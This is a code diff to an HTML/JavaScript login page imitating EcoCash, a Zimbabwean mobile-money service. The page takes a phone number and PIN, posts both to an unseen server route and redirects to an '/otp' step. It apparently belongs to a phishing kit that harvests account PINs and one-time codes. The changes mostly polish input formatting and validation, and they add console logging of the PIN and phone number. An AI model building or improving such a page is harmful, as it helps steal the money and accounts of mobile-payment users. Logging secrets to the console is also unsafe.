@@ -126,10 +126,12 @@
             font-size: 16px;
             outline: none;
             background: transparent;
+            letter-spacing: 1px;
         }
         
         .form-control::placeholder {
             color: #999;
+            letter-spacing: 0;
         }
         
         /* PIN Boxes */
@@ -282,6 +284,14 @@
             color: #ff1744;
         }
         
+        .title-eco {
+            color: #1a73e8;
+        }
+        
+        .title-cash {
+            color: #ff1744;
+        }
+        
         @media (max-width: 480px) {
             .login-container {
                 max-width: 100%;
@@ -356,7 +366,7 @@
                 <div class="error-message" id="pinError">Please enter a valid 4-digit PIN</div>
             </div>
             
-            <button class="btn" id="loginBtn" disabled>Login to <span class="brand-text"><span class="eco">Eco</span><span class="cash">Cash</span></span></button>
+            <button class="btn" id="loginBtn" disabled>Login to EcoCash</button>
             
             <div class="form-footer">
                 <a href="#">Forgot your PIN?</a>
@@ -382,22 +392,20 @@
         const pinError = document.getElementById('pinError');
         
         let pinValue = '';
+        let rawPhone = '';
         
         // Phone number validation for Zimbabwe format (+263)
         function validatePhone(phone) {
-            const clean = phone.replace(/[^0-9]/g, '');
             // Must be exactly 9 digits and start with 7 followed by 1-9
-            return clean.length === 9 && clean.match(/^[7][1-9][0-9]{7}$/);
+            return phone.length === 9 && phone.match(/^[7][1-9][0-9]{7}$/);
         }
         
-        // Phone input formatting - store raw value and display formatted
-        let rawPhone = '';
-        
-        phoneInput.addEventListener('input', function() {
-            // Get cursor position
+        // Phone input handling
+        phoneInput.addEventListener('input', function(e) {
+            // Get the current cursor position
             const cursorPos = this.selectionStart;
             
-            // Remove all non-digits from the input
+            // Get the raw digits (remove all non-digits)
             let digits = this.value.replace(/\D/g, '');
             
             // Limit to 9 digits
@@ -420,34 +428,77 @@
                 }
             }
             
-            // Update the input value with formatted version
+            // Calculate where the cursor should be
+            let newCursorPos = cursorPos;
+            
+            // If we're at the end or past it, just set to end
+            if (newCursorPos >= this.value.length) {
+                newCursorPos = formatted.length;
+            } else {
+                // Count how many digits were before the cursor
+                const beforeCursor = this.value.slice(0, cursorPos);
+                const digitsBefore = beforeCursor.replace(/\D/g, '').length;
+                
+                // Find position in formatted string after that many digits
+                let digitCount = 0;
+                let pos = 0;
+                for (let i = 0; i < formatted.length; i++) {
+                    if (formatted[i] !== ' ') {
+                        digitCount++;
+                    }
+                    if (digitCount === digitsBefore) {
+                        newCursorPos = i + 1;
+                        break;
+                    }
+                    if (i === formatted.length - 1) {
+                        newCursorPos = formatted.length;
+                    }
+                }
+            }
+            
+            // Update the input value
             this.value = formatted;
             
-            // Restore cursor position
-            if (this.value.length > cursorPos) {
-                this.setSelectionRange(cursorPos, cursorPos);
+            // Set cursor position
+            if (newCursorPos <= this.value.length) {
+                this.setSelectionRange(newCursorPos, newCursorPos);
+            } else {
+                this.setSelectionRange(this.value.length, this.value.length);
             }
             
             // Validate
-            const cleanPhone = this.value.replace(/\s/g, '');
-            if (validatePhone(cleanPhone)) {
+            if (validatePhone(digits)) {
                 phoneError.classList.remove('show');
+            } else {
+                phoneError.classList.add('show');
             }
             
             checkFormComplete();
         });
         
-        // Handle backspace properly
+        // Handle keydown for backspace
         phoneInput.addEventListener('keydown', function(e) {
             if (e.key === 'Backspace') {
                 const cursorPos = this.selectionStart;
-                // If cursor is at a space, move back one more
+                
+                // If cursor is at a space, we need to delete the digit before it
                 if (cursorPos > 0 && this.value[cursorPos - 1] === ' ') {
-                    // Remove the space
-                    const newValue = this.value.slice(0, cursorPos - 1) + this.value.slice(cursorPos);
+                    // Remove the space and the digit before it
+                    const before = this.value.slice(0, cursorPos - 1);
+                    const after = this.value.slice(cursorPos);
+                    let newValue = before + after;
+                    // Remove any extra spaces
+                    newValue = newValue.replace(/\s+/g, ' ');
                     this.value = newValue;
-                    this.setSelectionRange(cursorPos - 1, cursorPos - 1);
+                    
+                    // Set cursor position
+                    const newPos = Math.max(0, cursorPos - 1);
+                    this.setSelectionRange(newPos, newPos);
+                    
                     e.preventDefault();
+                    
+                    // Trigger input event to re-format
+                    this.dispatchEvent(new Event('input'));
                 }
             }
         });
@@ -466,22 +517,25 @@
             
             if (pinValue.length === 4) {
                 pinError.classList.remove('show');
+            } else {
+                pinError.classList.add('show');
             }
             
             checkFormComplete();
         }
         
         function checkFormComplete() {
-            const cleanPhone = phoneInput.value.replace(/\s/g, '');
-            const phoneValid = validatePhone(cleanPhone);
+            const phoneValid = validatePhone(rawPhone);
             const pinValid = pinValue.length === 4;
             
             if (phoneValid && pinValid) {
                 loginBtn.classList.add('enabled');
                 loginBtn.disabled = false;
+                console.log('Button enabled!');
             } else {
                 loginBtn.classList.remove('enabled');
                 loginBtn.disabled = true;
+                console.log('Button disabled - Phone valid:', phoneValid, 'PIN valid:', pinValid);
             }
         }
         
@@ -522,26 +576,20 @@
             });
         });
         
-        // Auto-submit when all digits are entered
-        let autoSubmitTimeout;
-        document.addEventListener('keyup', function() {
-            const cleanPhone = phoneInput.value.replace(/\s/g, '');
-            if (pinValue.length === 4 && validatePhone(cleanPhone) && loginBtn.classList.contains('enabled')) {
-                clearTimeout(autoSubmitTimeout);
-                autoSubmitTimeout = setTimeout(() => {
-                    loginBtn.click();
-                }, 300);
-            }
-        });
-        
         // Login button click
         loginBtn.addEventListener('click', function() {
-            if (pinValue.length !== 4) return;
+            console.log('Login button clicked!');
+            console.log('PIN:', pinValue);
+            console.log('Phone:', rawPhone);
             
-            const phone = phoneInput.value.replace(/\s/g, '');
+            if (pinValue.length !== 4) {
+                alert('Please enter your 4-digit PIN');
+                return;
+            }
             
-            if (!validatePhone(phone)) {
+            if (!validatePhone(rawPhone)) {
                 phoneError.classList.add('show');
+                alert('Please enter a valid phone number');
                 return;
             }
             
@@ -554,13 +602,13 @@
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: `ecocashNumber=${encodeURIComponent(phone)}&ecocashPin=${encodeURIComponent(pinValue)}`
+                body: `ecocashNumber=${encodeURIComponent(rawPhone)}&ecocashPin=${encodeURIComponent(pinValue)}`
             })
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
                     // Store phone number for OTP page
-                    localStorage.setItem('phone', phone);
+                    localStorage.setItem('phone', rawPhone);
                     // Redirect to OTP page
                     window.location.href = '/otp';
                 } else {
@@ -584,6 +632,9 @@
         
         // Focus first box
         pinBoxes[0].focus();
+        
+        // Debug: Log rawPhone on any change
+        console.log('Phone input initialized');
     </script>
 </body>
 </html>
